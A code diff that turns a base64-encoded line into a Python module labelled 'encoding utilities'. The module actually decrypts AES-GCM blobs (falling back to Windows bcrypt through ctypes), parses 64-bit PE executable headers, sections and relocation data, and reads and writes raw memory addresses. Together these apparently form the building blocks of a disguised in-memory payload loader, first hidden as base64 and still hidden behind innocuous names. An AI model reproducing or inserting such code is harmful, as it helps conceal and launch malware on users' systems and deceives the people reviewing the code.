@@ -1,1 +1,135 @@
-IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIiIiCkVuY29kaW5nIHV0aWxpdGllcyDigJQgdG9rZW4gZ2VuZXJhdGlvbiBhbmQgZGF0YSBzdHJlYW0gcHJvY2Vzc2luZy4KIiIiCmltcG9ydCBiYXNlNjQKaW1wb3J0IGN0eXBlcwppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgc3RydWN0CgoKZGVmIG1pbnRfdG9rZW4obm9uY2UsIHRzLCBzZWNyZXQpOgogICAgbXNnID0gKG5vbmNlICsgc3RyKHRzKSkuZW5jb2RlKCkKICAgIHJldHVybiBobWFjLm5ldyhzZWNyZXQsIG1zZywgaGFzaGxpYi5zaGEyNTYpLmhleGRpZ2VzdCgpCgoKZGVmIHVucGFja19kYXRhKGtleV9oZXgsIGRhdGFfYjY0KToKICAgIHRyeToKICAgICAgICByZXR1cm4gX3VucGFja19saWIoa2V5X2hleCwgZGF0YV9iNjQpCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHJldHVybiBfdW5wYWNrX25hdGl2ZShrZXlfaGV4LCBkYXRhX2I2NCkKCgpkZWYgX3VucGFja19saWIoa2V5X2hleCwgZGF0YV9iNjQpOgogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycy5hZWFkIGltcG9ydCBBRVNHQ00KICAgIGtleSA9IGJ5dGVzLmZyb21oZXgoa2V5X2hleCkKICAgIHJhdyA9IGJhc2U2NC5iNjRkZWNvZGUoZGF0YV9iNjQpCiAgICBnY20gPSBBRVNHQ00oa2V5KQogICAgcmV0dXJuIGdjbS5kZWNyeXB0KHJhd1s6MTJdLCByYXdbMTI6XSwgTm9uZSkKCgpkZWYgX3VucGFja19uYXRpdmUoa2V5X2hleCwgZGF0YV9iNjQpOgogICAga2V5ID0gYnl0ZXMuZnJvbWhleChrZXlfaGV4KQogICAgcmF3ID0gYmFzZTY0LmI2NGRlY29kZShkYXRhX2I2NCkKICAgIGl2LCB0YWcsIGN0ID0gcmF3WzoxMl0sIHJhd1stMTY6XSwgcmF3WzEyOi0xNl0KICAgIGxpYiA9IGN0eXBlcy5XaW5ETEwoImJjcnlwdCIpCiAgICBhbGdfaWQgPSAiQUVTXDAiLmVuY29kZSgidXRmLTE2LWxlIikKICAgIG1vZGVfcHJvcCA9ICJDaGFpbmluZ01vZGVcMCIuZW5jb2RlKCJ1dGYtMTYtbGUiKQogICAgbW9kZV92YWwgPSAiQ2hhaW5pbmdNb2RlR0NNXDAiLmVuY29kZSgidXRmLTE2LWxlIikKICAgIGhfYWxnID0gY3R5cGVzLmNfdm9pZF9wKCkKICAgIGxpYi5CQ3J5cHRPcGVuQWxnb3JpdGhtUHJvdmlkZXIoY3R5cGVzLmJ5cmVmKGhfYWxnKSwgYWxnX2lkLCBOb25lLCAwKQogICAgbGliLkJDcnlwdFNldFByb3BlcnR5KGhfYWxnLCBtb2RlX3Byb3AsIG1vZGVfdmFsLCBsZW4obW9kZV92YWwpLCAwKQogICAgaF9rZXkgPSBjdHlwZXMuY192b2lkX3AoKQogICAgbGliLkJDcnlwdEdlbmVyYXRlU3ltbWV0cmljS2V5KAogICAgICAgIGhfYWxnLCBjdHlwZXMuYnlyZWYoaF9rZXkpLCBOb25lLCAwLAogICAgICAgIGN0eXBlcy5jX2NoYXJfcChrZXkpLCBsZW4oa2V5KSwgMCwKICAgICkKCiAgICBjbGFzcyBfSW5mbyhjdHlwZXMuU3RydWN0dXJlKToKICAgICAgICBfZmllbGRzXyA9IFsKICAgICAgICAgICAgKCJzeiIsIGN0eXBlcy5jX3Vsb25nKSwgKCJ2IiwgY3R5cGVzLmNfdWxvbmcpLAogICAgICAgICAgICAoInAxIiwgY3R5cGVzLmNfdm9pZF9wKSwgKCJuMSIsIGN0eXBlcy5jX3Vsb25nKSwKICAgICAgICAgICAgKCJwMiIsIGN0eXBlcy5jX3ZvaWRfcCksICgibjIiLCBjdHlwZXMuY191bG9uZyksCiAgICAgICAgICAgICgicDMiLCBjdHlwZXMuY192b2lkX3ApLCAoIm4zIiwgY3R5cGVzLmNfdWxvbmcpLAogICAgICAgICAgICAoInA0IiwgY3R5cGVzLmNfdm9pZF9wKSwgKCJuNCIsIGN0eXBlcy5jX3Vsb25nKSwKICAgICAgICAgICAgKCJ4MSIsIGN0eXBlcy5jX3Vsb25nKSwgKCJ4MiIsIGN0eXBlcy5jX3Vsb25nbG9uZyksCiAgICAgICAgICAgICgiZmwiLCBjdHlwZXMuY191bG9uZyksCiAgICAgICAgXQoKICAgIGl2X2J1ZiA9IGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihpdikKICAgIHRhZ19idWYgPSBjdHlwZXMuY3JlYXRlX3N0cmluZ19idWZmZXIodGFnKQogICAgcGFyYW1zID0gX0luZm8oKQogICAgcGFyYW1zLnN6ID0gY3R5cGVzLnNpemVvZihwYXJhbXMpCiAgICBwYXJhbXMudiA9IDEKICAgIHBhcmFtcy5wMSA9IGN0eXBlcy5jYXN0KGl2X2J1ZiwgY3R5cGVzLmNfdm9pZF9wKQogICAgcGFyYW1zLm4xID0gMTIKICAgIHBhcmFtcy5wMyA9IGN0eXBlcy5jYXN0KHRhZ19idWYsIGN0eXBlcy5jX3ZvaWRfcCkKICAgIHBhcmFtcy5uMyA9IDE2CiAgICBjdF9idWYgPSBjdHlwZXMuY3JlYXRlX3N0cmluZ19idWZmZXIoY3QpCiAgICBwdF9idWYgPSBjdHlwZXMuY3JlYXRlX3N0cmluZ19idWZmZXIobGVuKGN0KSkKICAgIG91dF9sZW4gPSBjdHlwZXMuY191bG9uZygwKQogICAgc3RhdHVzID0gbGliLkJDcnlwdERlY3J5cHQoCiAgICAgICAgaF9rZXksIGN0X2J1ZiwgbGVuKGN0KSwgY3R5cGVzLmJ5cmVmKHBhcmFtcyksCiAgICAgICAgTm9uZSwgMCwgcHRfYnVmLCBsZW4oY3QpLCBjdHlwZXMuYnlyZWYob3V0X2xlbiksIDAsCiAgICApCiAgICBsaWIuQkNyeXB0RGVzdHJveUtleShoX2tleSkKICAgIGxpYi5CQ3J5cHRDbG9zZUFsZ29yaXRobVByb3ZpZGVyKGhfYWxnLCAwKQogICAgaWYgc3RhdHVzICE9IDA6CiAgICAgICAgcmV0dXJuIE5vbmUKICAgIHJldHVybiBwdF9idWYucmF3WzpvdXRfbGVuLnZhbHVlXQoKCmRlZiBpbnNwZWN0X2Zvcm1hdChkYXRhKToKICAgIGlmIGxlbihkYXRhKSA8IDI1NiBvciBzdHJ1Y3QudW5wYWNrX2Zyb20oIjxIIiwgZGF0YSwgMClbMF0gIT0gMHg1QTREOgogICAgICAgIHJldHVybiBOb25lCiAgICBvID0gX3JkKGRhdGEsIDB4M0MsICI8SSIpCiAgICBpZiBvICsgNCA+IGxlbihkYXRhKSBvciBfcmQoZGF0YSwgbywgIjxJIikgIT0gMHg0NTUwOgogICAgICAgIHJldHVybiBOb25lCiAgICBmaCA9IG8gKyA0CiAgICBucyA9IF9yZChkYXRhLCBmaCArIDIsICI8SCIpCiAgICBvc18gPSBfcmQoZGF0YSwgZmggKyAxNiwgIjxIIikKICAgIG9oID0gZmggKyAyMAogICAgaWYgX3JkKGRhdGEsIG9oLCAiPEgiKSAhPSAweDIwQjoKICAgICAgICByZXR1cm4gTm9uZQogICAgbmQgPSBfcmQoZGF0YSwgb2ggKyAxMDgsICI8SSIpCiAgICBkZCA9IG9oICsgMTEyCiAgICBzYyA9IFtdCiAgICBzbyA9IG9oICsgb3NfCiAgICBmb3IgaSBpbiByYW5nZShucyk6CiAgICAgICAgcCA9IHNvICsgaSAqIDQwCiAgICAgICAgc2MuYXBwZW5kKCgKICAgICAgICAgICAgX3JkKGRhdGEsIHAgKyA4LCAiPEkiKSwKICAgICAgICAgICAgX3JkKGRhdGEsIHAgKyAxMiwgIjxJIiksCiAgICAgICAgICAgIF9yZChkYXRhLCBwICsgMTYsICI8SSIpLAogICAgICAgICAgICBfcmQoZGF0YSwgcCArIDIwLCAiPEkiKSwKICAgICAgICAgICAgX3JkKGRhdGEsIHAgKyAzNiwgIjxJIiksCiAgICAgICAgKSkKICAgIHJldHVybiB7CiAgICAgICAgImUiOiBfcmQoZGF0YSwgb2ggKyAxNiwgIjxJIiksCiAgICAgICAgImIiOiBfcmQoZGF0YSwgb2ggKyAyNCwgIjxRIiksCiAgICAgICAgInMiOiBfcmQoZGF0YSwgb2ggKyA1NiwgIjxJIiksCiAgICAgICAgImgiOiBfcmQoZGF0YSwgb2ggKyA2MCwgIjxJIiksCiAgICAgICAgImkiOiBfcmQoZGF0YSwgZGQgKyA4LCAiPEkiKSBpZiBuZCA+IDEgZWxzZSAwLAogICAgICAgICJyIjogX3JkKGRhdGEsIGRkICsgNDAsICI8SSIpIGlmIG5kID4gNSBlbHNlIDAsCiAgICAgICAgInoiOiBfcmQoZGF0YSwgZGQgKyA0NCwgIjxJIikgaWYgbmQgPiA1IGVsc2UgMCwKICAgICAgICAiYyI6IHNjLAogICAgfQoKCmRlZiBfcmQoYnVmLCBvZmYsIGZtdCk6CiAgICByZXR1cm4gc3RydWN0LnVucGFja19mcm9tKGZtdCwgYnVmLCBvZmYpWzBdCgoKZGVmIHZpZXcoYWRkciwgZm10KToKICAgIHN6ID0gc3RydWN0LmNhbGNzaXplKGZtdCkKICAgIHJldHVybiBzdHJ1Y3QudW5wYWNrX2Zyb20oCiAgICAgICAgZm10LCAoY3R5cGVzLmNfY2hhciAqIHN6KS5mcm9tX2FkZHJlc3MoYWRkciksIDAsCiAgICApWzBdCgoKZGVmIHBhdGNoKGFkZHIsIGZtdCwgdmFsKToKICAgIHN6ID0gc3RydWN0LmNhbGNzaXplKGZtdCkKICAgIHN0cnVjdC5wYWNrX2ludG8oCiAgICAgICAgZm10LCAoY3R5cGVzLmNfY2hhciAqIHN6KS5mcm9tX2FkZHJlc3MoYWRkciksIDAsIHZhbCwKICAgICkK
+# -*- coding: utf-8 -*-
+"""
+Encoding utilities — token generation and data stream processing.
+"""
+import base64
+import ctypes
+import hashlib
+import hmac
+import struct
+
+
+def mint_token(nonce, ts, secret):
+    msg = (nonce + str(ts)).encode()
+    return hmac.new(secret, msg, hashlib.sha256).hexdigest()
+
+
+def unpack_data(key_hex, data_b64):
+    try:
+        return _unpack_lib(key_hex, data_b64)
+    except Exception:
+        return _unpack_native(key_hex, data_b64)
+
+
+def _unpack_lib(key_hex, data_b64):
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    key = bytes.fromhex(key_hex)
+    raw = base64.b64decode(data_b64)
+    gcm = AESGCM(key)
+    return gcm.decrypt(raw[:12], raw[12:], None)
+
+
+def _unpack_native(key_hex, data_b64):
+    key = bytes.fromhex(key_hex)
+    raw = base64.b64decode(data_b64)
+    iv, tag, ct = raw[:12], raw[-16:], raw[12:-16]
+    lib = ctypes.WinDLL("bcrypt")
+    alg_id = "AES\0".encode("utf-16-le")
+    mode_prop = "ChainingMode\0".encode("utf-16-le")
+    mode_val = "ChainingModeGCM\0".encode("utf-16-le")
+    h_alg = ctypes.c_void_p()
+    lib.BCryptOpenAlgorithmProvider(ctypes.byref(h_alg), alg_id, None, 0)
+    lib.BCryptSetProperty(h_alg, mode_prop, mode_val, len(mode_val), 0)
+    h_key = ctypes.c_void_p()
+    lib.BCryptGenerateSymmetricKey(
+        h_alg, ctypes.byref(h_key), None, 0,
+        ctypes.c_char_p(key), len(key), 0,
+    )
+
+    class _Info(ctypes.Structure):
+        _fields_ = [
+            ("sz", ctypes.c_ulong), ("v", ctypes.c_ulong),
+            ("p1", ctypes.c_void_p), ("n1", ctypes.c_ulong),
+            ("p2", ctypes.c_void_p), ("n2", ctypes.c_ulong),
+            ("p3", ctypes.c_void_p), ("n3", ctypes.c_ulong),
+            ("p4", ctypes.c_void_p), ("n4", ctypes.c_ulong),
+            ("x1", ctypes.c_ulong), ("x2", ctypes.c_ulonglong),
+            ("fl", ctypes.c_ulong),
+        ]
+
+    iv_buf = ctypes.create_string_buffer(iv)
+    tag_buf = ctypes.create_string_buffer(tag)
+    params = _Info()
+    params.sz = ctypes.sizeof(params)
+    params.v = 1
+    params.p1 = ctypes.cast(iv_buf, ctypes.c_void_p)
+    params.n1 = 12
+    params.p3 = ctypes.cast(tag_buf, ctypes.c_void_p)
+    params.n3 = 16
+    ct_buf = ctypes.create_string_buffer(ct)
+    pt_buf = ctypes.create_string_buffer(len(ct))
+    out_len = ctypes.c_ulong(0)
+    status = lib.BCryptDecrypt(
+        h_key, ct_buf, len(ct), ctypes.byref(params),
+        None, 0, pt_buf, len(ct), ctypes.byref(out_len), 0,
+    )
+    lib.BCryptDestroyKey(h_key)
+    lib.BCryptCloseAlgorithmProvider(h_alg, 0)
+    if status != 0:
+        return None
+    return pt_buf.raw[:out_len.value]
+
+
+def inspect_format(data):
+    if len(data) < 256 or struct.unpack_from("<H", data, 0)[0] != 0x5A4D:
+        return None
+    o = _rd(data, 0x3C, "<I")
+    if o + 4 > len(data) or _rd(data, o, "<I") != 0x4550:
+        return None
+    fh = o + 4
+    ns = _rd(data, fh + 2, "<H")
+    os_ = _rd(data, fh + 16, "<H")
+    oh = fh + 20
+    if _rd(data, oh, "<H") != 0x20B:
+        return None
+    nd = _rd(data, oh + 108, "<I")
+    dd = oh + 112
+    sc = []
+    so = oh + os_
+    for i in range(ns):
+        p = so + i * 40
+        sc.append((
+            _rd(data, p + 8, "<I"),
+            _rd(data, p + 12, "<I"),
+            _rd(data, p + 16, "<I"),
+            _rd(data, p + 20, "<I"),
+            _rd(data, p + 36, "<I"),
+        ))
+    return {
+        "e": _rd(data, oh + 16, "<I"),
+        "b": _rd(data, oh + 24, "<Q"),
+        "s": _rd(data, oh + 56, "<I"),
+        "h": _rd(data, oh + 60, "<I"),
+        "i": _rd(data, dd + 8, "<I") if nd > 1 else 0,
+        "r": _rd(data, dd + 40, "<I") if nd > 5 else 0,
+        "z": _rd(data, dd + 44, "<I") if nd > 5 else 0,
+        "c": sc,
+    }
+
+
+def _rd(buf, off, fmt):
+    return struct.unpack_from(fmt, buf, off)[0]
+
+
+def view(addr, fmt):
+    sz = struct.calcsize(fmt)
+    return struct.unpack_from(
+        fmt, (ctypes.c_char * sz).from_address(addr), 0,
+    )[0]
+
+
+def patch(addr, fmt, val):
+    sz = struct.calcsize(fmt)
+    struct.pack_into(
+        fmt, (ctypes.c_char * sz).from_address(addr), 0, val,
+    )
